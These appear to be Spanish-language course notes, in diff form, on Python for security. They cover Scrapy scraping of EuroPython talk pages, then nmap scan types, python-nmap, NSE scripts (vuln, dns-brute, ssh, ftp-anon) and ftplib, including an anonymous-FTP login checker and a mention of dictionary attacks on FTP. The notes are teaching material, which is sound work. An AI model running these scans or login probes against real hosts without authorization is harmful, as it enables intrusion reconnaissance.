+						raise DropItem("No existe el elemento: %s" % item['key'])
+
+			- Un punto más a tener en cuenta es que cuando creamos un objeto de este tipo debemos 
+			introducir en el fichero settings.py del proyecto una lí­nea como la siguiente 
+			para activar el pipeline en la variable ITEM_PIPELINES: ITEM_PIPELINES = [ 'proyecto.pipeline.MyPipeline':300,]
+			
+			
+		7.9 Fichero configuración de scrapy settings.py
+			
+			- El fichero de configuración lo podemos encontrar en el directorio raíz del proyecto para que el spyder se puede ejecutar correctamente.
+			- Este archivo almacena la configuración del spyder y le permite modificar el comportamiento de los spyders cuando sea necesario.
+			- Principales características en forma de variables:
+				- DEFAULT_REQUEST_HEADERS -> Esta característica es similar al USER_AGENT y se puede usar con algunos sitios que no le permiten ver sus datos sin usar cabeceras en las peticiones.
+				- USER_AGENT -> Es parte del encabezado, pero también se puede configurar por separado.
+				- DOWNLOAD_DELAY -> Cada solicitud se retrasa el tiempo en segundos especificado en esta variable. Se recomienda limitar la velocidad para evitar ataques DOS.
+				- ROBOTSTXT_OBEY -> ofrece una opción para seguir o ignorar el archivo robots.txt en el sitio web. Describe el comportamiento deseado de los bots en el sitio web.
+				Esto podria ser un ejemplo de un setting.py:
+				
+				
+							# Identificar el agente de usuario
+
+							USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
+
+							#respeta las reglas definidas en el fichero de robots.txt
+
+							ROBOTSTXT_OBEY = True
+
+							# Sobrescribe las cabeceras de la petición predeterminadas
+
+							DEFAULT_REQUEST_HEADERS = {
+
+							   "Accept": "application/json, text/javascript, */*; q=0.01",
+
+							   "DNT": "1",
+
+							   "Accept-Encoding": "gzip, deflate, br",
+
+							   "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8",
+
+							   "x-requested-with": "XMLHttpRequest",
+
+							}
+
+							#Configure un tiempo de retardo para las solicitudes en el mismo sitio web 
+
+							# (predeterminado: 0)
+
+							# See http://scrapy.readthedocs.org/en/latest/topics/settings.html#download-delay
+
+							# See also autothrottle settings and docs
+
+							DOWNLOAD_DELAY = 3
+							
+							
+							
+		7.10 Exportación de resultados en formatos json, csv, xml
+		
+			- Con Scrapy podemos recopilar la información y guardarla en un archivo en uno de los formatos compatibles o incluso directamente en una base de datos usando un pipeline.
+			- Con este comando estamos guardando por ejemplo los item encontrados en un formato: 
+					- JSON: $ scrapy crawl <crawler_name> -o items.json -t json
+					- CSV:  $ scrapy crawl <crawler_name> -o items.csv -t csv
+					- XML:  $ scrapy crawl <crawler_name> -o items.xml -t xml
+					
+			
+			- Podemos seguir estas reglas para administrar la ejecución del rastreador:
+			
+				1 Si el proceso de scraping falla, puede buscar en el registro de la consola las líneas que incluyen [Scrapy] DEBUG.
+				2 Si desea parar el proceso de Scrapy mientras aún se está procesando basta con presionar la combinación de teclas Ctrl + C.
+				3 Cuando Scrapy haya terminado de procesar los datos, mostrará la siguiente información en la consola de registro: [scrapy] INFO: Spider closed (finished).
+				4 Por defecto, Scrapy añade nuevos datos al final del archivo de salida si ya existe. Si el archivo no existe, creará uno. Por lo tanto, si solo desea obtener datos nuevos y descartar los anteriores, es recomendable eliminar el archivo anterior.
+			
+			
+		7.11 Proyecto Scrapy para extraer las conferencias europython
+		
+			- En esta sección, vamos a construir un proyecto con Scrapy que nos permite extraer los datos de las sesiones de la conferencia EuroPython siguiendo el patrón de la siguiente URL:
+				http://ep{year}.europython.eu/en/events/sessions
+				
+			- Para crear el proyecto usaremos la siguiente linea de comando -> $ scrapy startproject europython
+			- Esto nos creara el proyecto y los ficheros necesarios para configurar nuestro spider.
+			- Esta es la estructura del proyecto:
+				- scrapy.cfg 			  -> fichero de configuración del proyecto.
+				- europython/			  -> módulo de Python de nuestro proyecto donde incluiremos nuestro código.
+				- europython/items.py 	  -> archivo donde definimos los campos que queremos extraer.
+				- europython/pipelines.py -> definimos los pipelines del proyecto.
+				- europython/settings.py  -> fichero de configuración.
+				- europython/spiders/ 	  -> directorio donde encontramos los spiders.
+				
+			- Como nuestros items contendrán los datos relacionados con el título y la descripción, definiremos estos atributos en el archivo items.py.
+			- En la clase EuropythonItem, que se crea de forma predeterminada, añadimos el nombre de los elementos que usaremos.
+			- La forma más sencilla es instanciar objetos de la clase scrapy.Field.
+			- Este es el contenido del archivo items.py donde definimos los campos y la información que vamos a extraer:
+			
+			
+			
+						 import scrapy
+						from scrapy.loader.processors import Compose, MapCompose, Join
+						 
+						clean_text = Compose(MapCompose(lambda v: v.strip()), Join())   
+						 
+						def custom_field(text):
+							text = clean_text(text)
+							return text.strip()
+							
+						class EuropythonItem(scrapy.Item):
+							# define the fields for your item here like:
+							# name = scrapy.Field()
+							title = scrapy.Field(output_processor=custom_field)
+							author = scrapy.Field(output_processor=custom_field)
+							description = scrapy.Field(output_processor=custom_field)
+							date = scrapy.Field(output_processor=custom_field)
+							tags = scrapy.Field(output_processor=custom_field)
+							
+							
+			- La función custom_field() está utilizando para el formato de las cadenas de texto donde el método strip() nos permite eliminar cualquier espacio al principio y al final para cada uno de los campos y se aplicará automáticamente a todos los elementos que indicamos cuando los instanciamos.
+
+			- Los spiders son clases escritas por el usuario para extraer información de un dominio (o un grupo de dominios).
+			- Se definen como una lista inicial de URLs, para posteriormente definir la lógica necesaria para seguir los enlaces y analizar el contenido de esas páginas para extraer elementos.
+			- Este spyder tendrá un método constructor init para inicializar el spyder, la url de la que queremos extraer los datos y un parámetro adicional que indica el año del que queremos extraer la información.
+			- En el archivo europython_spider.py definimos la clase EuropythonSpider.
+			- En esta clase se define el spider que a partir de la url de inicio rastreará los enlaces que va encontrando en función del patrón indicado, y para cada entrada obtendrá los datos correspondientes a cada sesión.
+			
+			
+			     #!/usr/bin/env python3
+     
+				import scrapy
+				from scrapy.spiders import CrawlSpider, Rule
+				from scrapy.linkextractors import LinkExtractor
+				from scrapy.linkextractors.lxmlhtml import LxmlLinkExtractor
+				from scrapy.loader import ItemLoader
+				 
+				from europython.items import EuropythonItem
+				 
+				class EuropythonSpider(CrawlSpider):
+					def __init__(self, year='', *args, **kwargs):
+						super(EuropythonSpider, self).__init__(*args, **kwargs)
+						self.year = year
+						self.start_urls = ['http://ep'+str(self.year)+".europython.eu/en/events/sessions"]
+						print('start url: '+str(self.start_urls[0]))
+					
+					name = "europython_spider"
+					allowed_domains = ["ep2016.europython.eu", "ep2017.europython.eu","ep2018.europython.eu","ep2019.europython.eu","ep2020.europython.eu"]
+					
+					# Pattern for entries that match the conference/talks and /talks format
+					rules = [Rule(LxmlLinkExtractor(allow=['conference/talks']),callback='process_response2016_17_18'),
+					Rule(LxmlLinkExtractor(allow=['talks']),callback='process_response_europython2019_20')]
+				 
+					def process_response2016_17_18(self, response):
+						itemLoader = ItemLoader(item=EuropythonItem(), response=response)
+						itemLoader.add_xpath('title', "//div[contains(@class, 'grid-100')]//h1/text()")
+						itemLoader.add_xpath('author', "//div[contains(@class, 'talk-speakers')]//a[1]/text()")
+						itemLoader.add_xpath('description', "//div[contains(@class, 'cms')]//p//text()")
+						itemLoader.add_xpath('date', "//section[contains(@class, 'talk when')]/strong/text()")
+						itemLoader.add_xpath('tags', "//div[contains(@class, 'all-tags')]/span/text()")
+						item = itemLoader.load_item()
+						return item
+						
+					def process_response_europython2019_20(self, response):
+						item = EuropythonItem()
+						item['title'] = response.xpath("//*[@id='talk_page']/div/div/div[1]/h1/text()").extract()
+						item['author'] = response.xpath("//*[@id='talk_page']/div/div/div[1]/h5/a/text()").extract()
+						item['description'] = response.xpath("//*[@id='talk_page']/div/div/div[1]/p[3]/text()").extract()
+						item['date'] = "July "+self.year
+						item['tags'] = response.xpath("//span[contains(@class, 'badge badge-secondary')]/text()").extract()
+				 
+						return item
+						
+			- Las variables más significativas de nuestro spyder son:
+				- name -> nombre del spyder.
+				- allowed_domains -> array con los dominios permitidos.
+				- start_urls -> array con las URLs a través de las cuales el spyder comienza a extraer datos.
+				- rules -> reglas para la extracción de enlaces (estos enlaces también serán visitados por la araña) de esta manera podemos hacer una búsqueda recursiva.
+				- process_response -> método que se ejecuta cada vez que se realiza una petición a una url. (La regla de extracción de enlaces se pasa como un parámetro).
+				- Las reglas están definidas por objetos del tipo Rule, que reciben como parámetro un objeto extractor de enlaces LinkExtractor donde allow es una expresión regular con la que los enlaces deben coincidir, y una función de callback que se pasa como un parámetro que se ejecutará cada vez que se extraiga un enlace y se realiza una solicitud a la URL de este enlace.
+				
+				Documentación clase Rule -> https://doc.scrapy.org/en/latest/topics/spiders.html#scrapy.contrib.spiders.Rule
+				
+				- En el spyder definimos también los métodos process_response2016_17_18() y process_response_europython2019_20() para extraer cada uno de los campos.
+				
+				- Podríamos utilizar scrapy shell para obtener las expresiones xpath necesarias para extraer dicha información:
+				
+				EJEMPLO:
+				
+					>>> fetch('https://ep2019.europython.eu/talks/KNhQYeQ-downloading-a-billion-files-in-python/')
+
+					[scrapy.core.engine] INFO: Spider opened
+
+					[scrapy.core.engine] DEBUG: Crawled (200) <GET https://ep2019.europython.eu/talks/KNhQYeQ-downloading-a-billion-files-in-python/> (referer: None)
+
+					>>> response.xpath("//*[@id='talk_page']/div/div/div[1]/h1/text()").extract()
+
+					['Downloading a Billion Files in Python']
+
+					>>> response.xpath("//*[@id='talk_page']/div/div/div[1]/h5/a/text()").extract()
+
+					['James Saryerwinnie']
+
+					>>> response.xpath("//*[@id='talk_page']/div/div/div[1]/p[3]/text()").extract()
+
+					["You've been given a task.  You need to download some files from a server to your local machine.   The files are fairly small, and you can list and access these files from the remote server through a REST API.  You'd like to download them as fast as possible.  The catch?  There's a billion of them.  Yes, one billion files."]
+
+					>>> response.xpath("//span[contains(@class, 'badge badge-secondary')]/text()"). extract()
+
+					['ASYNC / Concurreny', 'Case Study', 'Multi-Processing', 'Multi-Threading', 'Performance']
+
+				
+		7.12 Ejecutando el spyder Europython
+		
+			- Podemos ejecutar nuestro spyder con el siguiente comando: $ scrapy crawl europython_sypder -o europython_items.json -t json
+			- Donde los últimos parámetros indican que los datos extraí­dos se almacenan en un fichero llamado europython_items.json y que use el exportador para formato JSON.
+			
+			- $ scrapy crawl europython_spider -a year=2018 -o europython_items.json -t json
+			- De la misma forma podríamos proceder con las sesiones del año 2019:
+			- $ scrapy crawl europython_spider -a year=2019 -o europython_items.json -t json
+			
+			
+		7.13 Pipelines proyecto europython
+			
+			- ¿qué sucede si queremos separar la información o validar algunos campos antes de guardar los registros?
+			- Para esos casos podemos hacer uso de los pipelines.
+			- Para ello, primero necesitamos habilitar el uso de pipelines en el fichero settings.py.
+			- Consiste en añadir una línea que indique la clase donde se definirán las reglas para el pipeline definido, en este caso, estamos definiendo 4 pipelines.
+			
+			 ITEM_PIPELINES = {
+			'europython.pipelines.EuropythonJsonExport': 100,
+			'europython.pipelines.EuropythonXmlExport': 200,
+			'europython.pipelines.EuropythonCSVExport': 300,
+			'europython.pipelines.EuropythonSQLitePipeline': 400
+			}
+			
+			
+			- En el fichero pipelines.py definimos la clases que procesará los resultados y los guardan en diferentes formatos.
+			
+			- Class EuropythonJsonExport exporta los datos a JSON:
+			
+					class EuropythonJsonExport(object):    
+					def __init__(self):
+						self.file = codecs.open('europython_items.json', 'w+b', encoding='utf-8')
+				 
+					def process_item(self, item, spider):
+						line = json.dumps(dict(item), ensure_ascii=False) + "\n"
+						self.file.write(line)
+						return item
+				 
+					def spider_closed(self, spider):
+						self.file.close()
+						
+			- Class EuropythonXmlExport exporta los datos a XML: usando la clase XmlItemExporter del paquete scrapy.exporters.
+			
+					class EuropythonXmlExport(object):
+					
+					def __init__(self):
+						self.files = {}
+				 
+					@classmethod
+					def from_crawler(cls, crawler):
+						pipeline = cls()
+						crawler.signals.connect(pipeline.spider_opened, signals.spider_opened)
+						crawler.signals.connect(pipeline.spider_closed, signals.spider_closed)
+						return pipeline
+				 
+					def spider_opened(self, spider):
+						file = open('europython_items.xml', 'w+b')
+						self.files[spider] = file
+						self.exporter = XmlItemExporter(file)
+						self.exporter.start_exporting()
+				 
+					def spider_closed(self, spider):
+						self.exporter.finish_exporting()
+						file = self.files.pop(spider)
+						file.close()
+				 
+					def process_item(self, item, spider):
+						self.exporter.export_item(item)
+						return item
+						
+			- Class CsvItemExporter exporta los datos a CSV.
+			
+			
+			
+		7.14 Settings proyecto europython
+		
+			- En settings.py -> Definimos el nombre del módulo "europython.spiders" y los pipelines definidos entre los que destacamos uno que permite exportar los datos en formato xml(EuropythonXmlExport) y otro que guarda los datos en una base de datos sqlite (EuropythonSQLitePipeline).
+			
+			
+					# Scrapy settings for europython project
+					#
+					# For simplicity, this file contains only the most important settings by
+					# default. All the other settings are documented here:
+					#
+					#
+					http://doc.scrapy.org/en/latest/topics/settings.html
+					#
+					BOT_NAME = 'europython'
+					SPIDER_MODULES = ['europython.spiders']
+					NEWSPIDER_MODULE = 'europython.spiders'
+					 
+					# Configure item pipelines
+					# See http://scrapy.readthedocs.org/en/latest/topics/item-pipeline.html
+					ITEM_PIPELINES = {
+					 'europython.pipelines.EuropythonJsonExport': 100,
+					 'europython.pipelines.EuropythonXmlExport': 200,
+					 'europython.pipelines.EuropythonCSVExport': 300,
+					 'europython.pipelines.EuropythonSQLitePipeline': 400
+					}
+					 
+					DOWNLOADER_MIDDLEWARES = {
+					"scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware": 110,
+					#"europython.middlewares.ProxyMiddleware": 100,
+					}
+					
+			- De esta forma ya tenemos un proyecto funcional, si lo ejecutamos, extraerá la información deseada y la guardará en los archivos correspondientes.
+			- El Script se puede mejorar haciendo un Delay para que no nos bloquen el spider por las numerosas peticiones. DOWNLOAD_DELAY = 3 por ejemplo, hara una peticion por cada 3 segundos.
+			
+			
+			RESUMEN
+			
+			    - La arquitectura y los diferentes elementos que forman scrapy. Entre los principales elementos de la arquitectura podemos destacar los spiders, items y pipelines.
+
+				- La extracción de información a través de la shell de scrapy utilizando expresiones xpath para acceder a los diferentes elementos html para extraer la información que nos interese.
+
+				- Utilizar Scrapy Shell como una herramienta de línea de comandos que permite a los desarrolladores realizar pruebas de extracción de datos sobre una determinada url. Por ejemplo, podríamos utilizar las siguientes instrucciones para extraer el título de un dominio fetch('url_dominio'), response.xpath('//title/text()').extract()
+
+				- Utilizar el método Selector.xpath() para extraer información.
+
+				- La creación de un proyecto de scrapy con el comando $ scrapy startproject <nombre_proyecto&gt;
+
+				- Crear nuestro proyecto base con scrapy e identificar la estructura de ficheros y carpetas para definir nuestros spyders y pipelines dentro de este proyecto.
+
+				- Identificar los principales elementos de un proyecto de scrapy (items.py,spiders,pipelines.py).
+
+				- Definir la estructura base de nuestro spider heredando de la clase CrawlSpider donde definimos el nombre del spyder y el dominio del cual queremos extraer información.
+
+				- Definir el método parse() que permite analizar la respuesta, extraer los datos y obtener nuevas URLs para seguir creando nuevas peticiones a partir de ellas.
+
+				- Definir un pipeline que permita procesar los diferentes items extraídos.
+
+				- Analizar el fichero configuración de scrapy settings.py.
+
+				- Exportar los resultados extraídos en los formatos json, csv, xml.
+				
+				
+				
+***********************************************************************************************************************************************************************
+
+	Unidad 8 -> Escaneo de puertos y redes con python
+	
+		8.1 Nmap
+		
+			- Es una herramienta para la exploración de la red y la auditoría de seguridad.
+			- Permite realizar escaneados con ping, utilizando diferentes técnicas de escaneado de puertos, detección de versiones, e identificación mediante TCP/IP
+			- Nmap.org -> https://nmap.org/
+			
+			- Tipos de escaneos con nmap:
+			
+				- sT (TCP Connect Scan) >> Es la opción que se suele utilizar para detectar si un puerto está abierto o cerrado. Un puerto se encuentra abierto si el servidor responde con un paquete que contenga el flag ACK al enviar un paquete con el flag SYN.
+				
+				- sS (TCP Stealth Scan) >> Tipo de escaneo basado en el TCP Connect Scan, se diferencian en que la conexion con el puerto indicado no esta completa. Consiste en comprobar el paquete de respuesta del objetivo ante un paquete con el flag SYN habilitado. Si el objetivo responde con un paquete que tiene el flag RST, entonces se puede comprobar si el puerto está abierto o cerrado.
+				
+				- sU (UDP Scan) >> Tipo de escaneo basado en el protocolo UDP donde no se lleva a cabo un proceso de conexión, sino que simplemente se envía un paquete UDP para determinar si el puerto está abierto. Si la respuesta es otro paquete UDP, significa que el puerto está abierto. En el caso de que el puerto no esté abierto se recibirá un paquete ICMP del tipo 3(destino inalcanzable).
+				
+				- sA (TCP ACK Scan) >> Tipo de escaneo que permite saber si nuestra máquina objetivo tiene algún tipo de firewall en ejecución. Lo que hace este escaneo es enviar un paquete con el flag ACK activado y se envía a la máquina objetivo. En el caso de que la máquina remota responda con un paquete que tenga el flag RST activado, se puede determinar que el puerto no se encuentra filtrado por ningún firewall. En el caso de que el no responda o lo haga con un paquete ICMP del tipo se puede determinar que hay un firewall filtrando los paquetes enviados en el puerto indicado.
+				
+				- sN (TCP NULL Scan) >> Tipo de escaneo que envía un paquete TCP a la máquina objetivo sin ningún flag. Si la máquina remota no emita ninguna respuesta, se puede determinar que el puerto se encuentra abierto. Si la máquina remota devuelve un flag RST, podemos decir que el puerto se encuentra cerrado.
+				
+				- sF (TCP FIN Scan) >> Tipo de escaneo que envía un paquete TCP a la máquina objetivo con el flag FIN. Si la máquina remota no emita ninguna respuesta, se puede determinar que el puerto se encuentra abierto. Si la máquina remota devuelve un flag RST, podemos decir que el puerto se encuentra cerrado.
+				
+				- sX (TCP XMAS Scan) >> Tipo de escaneo que envía un paquete TCP a la máquina objetivo con los flags PSH, FIN, URG. Si la máquina remota no emita ninguna respuesta, se puede determinar que el puerto se encuentra abierto. Si la máquina remota devuelve un flag RST, podemos decir que el puerto se encuentra cerrado. Si en el paquete de respuesta obtenemos uno del tipo ICMP del tipo 3, entonces el puerto se encuentra filtrado.
+				
+				
+		8.2 Escaneo de puertos con Python-nmap
+		
+			- En python podemos hacer uso de nmap a través de la librería python-nmap la cual nos permite manipular fácilmente los resultados de un escaneo.
+			- Python-nmap es una herramienta que se utiliza dentro del ámbito de las auditorías de seguridad o pruebas de intrusión y su principal funcionalidad es descubrir qué puertos o servicios tiene en escucha un determinado host.
+			- Documentacion (Python-nmap) >> https://xael.org/pages/python-nmap-en.html
+			- Lo podemos instalar de las dos siguientes maneras:
+				1º sudo apt-get install python-pip nmap
+				2º sudo pip install python-nmap
+				
+			- Para empesar lo a usar necesitamos crear una instancia de la clase PortScanner(), con ello podemos acceder al método más importante: scan().
+			- Si ejecutamos el comando help(portScanner.scan) vemos que el método scan() de la clase PortScanner recibe tres argumentos: el host a analizar, los puertos y los argumentos. (todos deben ser en formato string)
+			- Solo el primer parámetro es obligatorio y el segundo y tercer parámetros son opcionales.
+			- Lo primero que hacemos es instanciar un objeto de la clase PortScanner() y a través de los métodos scan() y command_line() para ver el comando que nmap está ejecutando por debajo.
+			- El método all_hosts() nos devuelve información acerca de los hosts o direcciones ip que están activos.
+			- Con el método scaninfo() podemos ver los servicios que han dado algún tipo de respuesta en el proceso de escaneo, así como el método de escaneo.
+			- Si queremos visualizar de una manera fácil el resultado del escaneo, disponemos de la función csv(), el cual nos devolverá la información en formato csv que lo separa por punto y coma.
+			- Si necesitamos mostrar los resultados conforme los vayamos obteniendo podemos utilizar su clase PortScannerYield con el cual podemos ir obteniendo el progreso de nuestro escaneo.
+			- Para  realizar escaneos asíncronos podemos hacer uso de la clase PortScannerAsync(). En este caso, al realizar el escaneo le podemos indicar un parámetro adicional de función callback donde definimos la función de retorno, que se ejecutaría al finalizar el escaneo. Esta funcion es muy interesante para el control de errores.
+			
+			
+		8.3 Ejecutar scripts de nmap para detectar servicios y vulnerabilidades
+		
+			- NSE (Nmap Scripting Engine) es una herramienta que permite extender los tipos de escaneos que se pueden realizar e incluso realizar tareas de detección de vulnerabilidades en los servicios.
+			- A parte de detectar si un determinado puerto está abierto o cerrado, también podemos ejecutar rutinas más complejas que permiten filtrar información sobre un determinado objetivo.
+			- Actualmente incorpora el uso de scripts para comprobar algunas de las vulnerabilidades más conocidas.
+			- Están ordenados por categorías de la siguiente manera:
+			
+				- Auth      -> scripts disponibles para autenticación.
+				- Default   -> ejecuta los scripts básicos por defecto.
+				- Discovery -> scripts disponibles para recupera información del objetivo.
+				- External  -> script que contactan con fuentes externas.
+				- Intrusive -> scripts que son considerados intrusivos para el objetivo.
+				- Malware   -> scripts que comprueban la presencia de conexiones abiertas por códigos maliciosos o backdoors.
+				- Safe 	    -> ejecuta scripts que no son intrusivos.
+				- Vuln 		-> scripts que comprueban vulnerabilidades más conocidas y comummente explotadas.
+				- All 		-> ejecuta absolutamente todos los scripts con extensión NSE disponibles.
+				
+				
+			- Por lo general, el motor de scripts de NMAP puede ejecutar diferentes funcionalidades entre las que podemos destacar:
+			
+				- Descubrimiento de redes -> Los ejemplos incluyen encontrar la información whois del nombre de dominio de destino, encontrar puertos abiertos, consultas SNMP y enumerar los recursos y servicios NFS / SMB / RPC disponibles.
+				- Detección de vulnerabilidades -> Cuando se descubre una nueva vulnerabilidad, sería importante escanear la red para identificar los sistemas vulnerables antes que los atacantes los encuentren. NSE nos podría ayudar a realizar estas comprobaciones.
+				
+			- DOCUMENTACION de los scripts -> https://nmap.org/nsedoc/scripts/
+			- Se pueden ejecutar los script de nmap de estas dos formas, por nombre de script y por categoría:
+				
+				$ nmap -script (nombre del script) {target}
+				$ nmap -script (categoría) {target}
+			
+			- Ejemplo: si quisiéramos ejecutar todos los scripts de la categoría "discovery" para un determinado target -> $ nmap -script discovery scanme.nmap.org
+			- Con la opción --script-help podríamos ver una descripción de un script determinado. De esta forma podríamos obtener una descripción de lo que realmente hace. Para el script de obtener las cabeceras http podríamos obtener la siguiente información: $ nmap --script-help http-headers. Ejecutar ese comando nos mostraria la siguiente informacion:
+			
+						http-headers
+						Categories: discovery safe
+						https://nmap.org/nsedoc/scripts/http-headers.html
+						Performs a HEAD request for the root folder ("/") of a web server and displays the HTTP headers returned
+			
+			- Los subdominios normalmente se utilizan para alojar sitios web adicionales para un subconjunto específico de usuarios.
+			- El script dns-brute que podemos encontrar dentro los scripts de Nmap permite obtener subdominios y las direcciones IP de servidor correspondientes.
+			- DOCUMENTACION -> https://nmap.org/nsedoc/scripts/dns-brute.html
+			- Un ejemplo seria el siguiente: $ nmap -p80,443 --script dns-brute scanme.nmap.org
+			- En este punto, un pentester o analista de seguridad podría utilizar esta información para analizar de forma recursiva los diferentes subdominios encontrados.
+			
+			
+		8.4 Lanzar scripts para un determinado servicio
+		
+			- Podríamos ejecutar los scripts correspondientes al servicio ssh para el caso de que el puerto 22 esté abierto.
+			- De esta forma estamos ejecutando todos los scripts con nombres que comiencen con ssh: $ nmap --script "ssh-*" <ip_dominio&gt;
+			- En el siguiente ejemplo ejecutamos el script ssh-hostkey en el puerto 22 de SSH que obtiene información de la clave pública del servidor. Comando -> $ nmap -sV --script ssh-hostkey scanme.nmap.org
+			- También podríamos obtener más información acerca de los algoritmos de cifrado soportados por el servidor usando el script ssh2-enum-algos sobre el puerto 22.
+			Comando -> $ nmap -sV -p22 --script ssh2-enum-algos scanme.nmap.org
+			
+		8.5 Analizar el servicio FTP con scripts de nmap
+		
+			- Nmap proporciona usa serie de scripts que podríamos utilizar para analizar posibles vulnerabilidades sobre un servidor FTP que tenga abierto el puerto 21.
+			- Por ejemplo, el script ftp-anon, si lo ejecutamos sobre la máquina objetivo en el puerto 21 podemos saber si el servicio FTP permite la autenticación de forma anónima sin tener que introducir usuario y pasword.
+			Comando -> $ nmap -sV -p21 --script ftp-anon ftp.be.debian.org
+			
+			
+		8.6 Obtener las máquinas activas de un segmento de red
+			
+			- ICMP se trata de un protocolo muy útil para diagnóstico de errores en la capa de red y que se utiliza en herramientas tales como TRACEROUTE para el análisis del tráfico de un paquete por los diferentes routers por los que pasa.
+			- El protocolo ICMP es un protocolo de mensajes que permite saber si una máquina determinada está disponible o no. Para ello define una lista de mensajes
+			de control para diferentes propósitos, en el caso del comando PING se utilizan los mensajes "Echo Request" y "Echo Reply".
+			
+			- TRACEROUTE -> Comando que traza el recorrido entre routers, ofreciendo información acerca de las direcciones IPs hasta llegar en un máximo de saltos a la máquina destino.
+			
+			
+		8.7 Ejecutar comando ping en Python
+			
+			- El comando ping utiliza un mensaje ICMP del tipo ECHO_REQUEST para consultar si una máquina se encuentra activa y en el caso de que dicha máquina
+			conteste con un ICMP_ECHO_REPLY dentro del tiempo fijado antes de que se obtenga un timeout, se entiende que la máquina está activa.
+			- Si se obtiene un timeout durante la petición de ping se entiende que la máquina está caída o bien existe algún mecanismo de protección como un proxy que esté filtrando este tipo de mensajes. En este caso utilizamos el módulo subprocess que permite ejecutar el comando ping propio del sistema operativo.
+			
+			
+			
+		RESUMEN 
+		
+			    - Nmap como herramienta para obtener los puertos abiertos de una determinada máquina con el objetivo de realizar auditorías de seguridad.
+				
+				- Instalar y utilizar el módulo python-nmap con el objetivo de tener un mayor control sobre los resultados de escaneo sobre un servidor.
+				
+				- Utilizar la clase PortScanner() que contiene el método scan() que permite lanzar un escaneo de un servidor para una determinada lista de puertos.
+				
+				- Lanzar el proceso de escaneo con el método scan('ip/rango','puertos','argumentos'), donde solo el primer parámetro es obligatorio y el segundo y tercer parámetros son opcionales.
+				
+				- A través del método command_line() podemos ver ver el comando que nmap está ejecutando por debajo.
+				
+				- El método all_hosts() nos devuelve información acerca de los hosts o direcciones ip que están activos.
+				
+				- Con el método scaninfo() podemos ver los servicios que han dado algún tipo de respuesta en el proceso de escaneo, así como el método de escaneo.
+				
+				- Utilizar la función csv() con el objetivo de obtener el resultado del escaneo en un formato fácil de tratar para recoger la información que necesitemos.
+				
+				- Utilizar su clase PortScannerYield, con el cual podemos ir obteniendo el progreso de nuestro escaneo. 
+				
+				- Utilizar el comando nmap con el módulo os(operating system) con la llamada os.system(commando_nmap).
+				
+				- Utilizar el comando NMAP con el módulo subprocess con la llamada Popen(['nmap','-O','direccion_ip'], stdout=PIPE, stderr=PIPE).
+				
+				- Realizar escaneos asíncronos utilizando la clase PortScannerAsync(). Además, podemos definir una función de callback que se ejecute cada vez que nmap disponga de un resultado para la máquina que estemos analizando.
+				
+				- Utilizar NSE (Nmap Scripting Engine) como herramienta que permite extender los tipos de escaneos que se pueden realizar e incluso realizar tareas de detección de vulnerabilidades en los servicios.
+				
+				- Lanzar los scripts de nmap localizados en la ruta /usr/share/nmap/scripts utilizando el comando $ nmap -script (categoría) {target}
+				
+				- Lanzar los scripts de nmap para un determinado utilizando el comando $ nmap --script "ssh-*" <ip_dominio&gt;
+				
+				- Analizar posibles vulnerabilidades sobre un servidor FTP utilizando los scripts de nmap relacionados con el servicio FTP. Por ejemplo, podríamos comprobar si un servidor FTP permite el acceso anónimo con el comando $ nmap -sV -p21 --script ftp-anon <dominio&gt;
+				
+				- Obtener las máquinas activas de un segmento de red utilizando el módulo subprocess ejecutando el comando ping para determinar si una máquina está activa utilizando el método Popen(['ping', direccion_ip], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+
+		
+***********************************************************************************************************************************************************************
+
+	Unidad 9 -> Conexiones con servidores FTP, SFTP, SSH desde Python
+	
+		9.1 Conexiones con servidores FTP utilizando el módulo ftplib
+		
+			- FTPLib es una librería nativa en python que permite la conexión con servidores FTP y la ejecución de comandos en dichos servidores.
+			- Está diseñada para crear clientes FTP con pocas líneas de código y para realizar rutinas de admin server.
+			- DOCUMENTACION -> https://docs.python.org/3/library/ftplib.html
+			- Este módulo puede ser utilizado para crear scripts que permiten automatizar determinadas tareas o realizar ataques por diccionario contra un servidor FTP.
+			- Además, soporta conexiones cifradas con TLS, para ello se utilizan las utilidades definidas en la clase FTP_TLS.
+			
+			
+			- Podemos ahorra el uso de diversos métodos como connect(host, port, timeout) y login(user, pass) pasando como paraámetros host, usuario y clave directamente al método constructor de la clase FTP. (método __init__())
+			- La clase FTP se compone de los siguientes métodos:
+			
+				- FTP.connect(host[, puerto, tiemout]) 				  -> Se conecta al servidor FTP
+				- FTP.login(user, passwd) 							  -> Se loguea en el servidor
+				- FTP.close() 										  -> Finalia la conexion
+				- FTP.set_pasv(bool) 								  -> Establece la conexion en modo pasivo si el parametro es true
+				- FTP.getwelcome() 									  -> Retorna el mensaje de bienvenida del servidor
+				- FTP.dir() 										  -> Retorna un listado de archivos y directorios de carpeta actual
+				- FTP.cwd(path) 									  -> Cambia el directorio de trabajo actual a path 
+				- FTP.mkd(path) 									  -> Crea un nuevo directorio
+				- FTP.pwd() 										  -> Retorna el directorio de trabajo actual
+				- FTP.rmd(path) 									  -> Elimina el directorio path
+				- FTP.storlines('STOR destino', open(localfile, 'r')) -> Lee localfile y lo escribe en el destino 
+				- FTP.rename(actual, nuevo) 						  -> Renombra el archivo "actual" por "nuevo"
+				- FTP.delete(filename) 								  -> Elimina el archivo
+				Hay muchos mas.
+				
+			- Descargar ficheros de un servidor FTP.
+				
+				- Se puede hacer de dos maneras: 1º es conociendo la ruta exacta donde se encuentra ese fichero y el nombre exacto del fichero. 2º es mediante el método retrlines(), que acepta como parámetro el comando ftp a ejecutar.
+				- Documentacion comandos admitidos -> https://www.rfc-editor.org/rfc/rfc959.html
+				- Para descargarnos un archivo lo que hacemos es cambiarnos al directorio con el método cwd(). Para descargar el archivo se usa el método retrlines().
+				- Necesitamos pasar como parámetros de entrada el comando RETR con el nombre del archivo y una función de callback writeData() que se ejecutará cada vez que se reciba un bloque de datos.
+			
+			
+			- Podemos utilizar el módulo ftplib para construir un script para determinar si un servidor ofrece inicios de sesión anónimos.
+			- Este mecanismo consiste en suministrar al servidor FTP la palabra anonymous como nombre y contraseña del usuario.
+			- De esta forma, podemos realizar consultas al servidor FTP sin conocer los datos de un usuario específico.
+			- La función anonymousLogin(hostname) toma un nombre de host como parámetro y verifica la conexión con el servidor FTP con un usuario anónimo.
